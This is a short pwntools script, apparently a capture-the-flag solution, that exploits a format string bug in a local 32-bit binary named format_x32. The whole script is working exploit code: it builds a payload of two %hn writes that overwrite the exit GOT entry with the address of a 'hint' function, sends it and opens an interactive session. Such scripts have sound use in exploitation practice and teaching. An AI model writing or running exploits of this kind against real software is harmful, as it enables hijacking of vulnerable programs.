from pwn import*
o = process("./format_x32")
hint = 0x804851B
exit_got = 0x804A018
payload = b'aa' + p32(exit_got) + p32(exit_got+2)
payload += ("%{}d%8$hn".format(0x804-8-2)).encode()
payload += ("%{}d%7$hn".format(0x851b-0x804)).encode()
pause()
o.sendline(payload)
o.interactive()
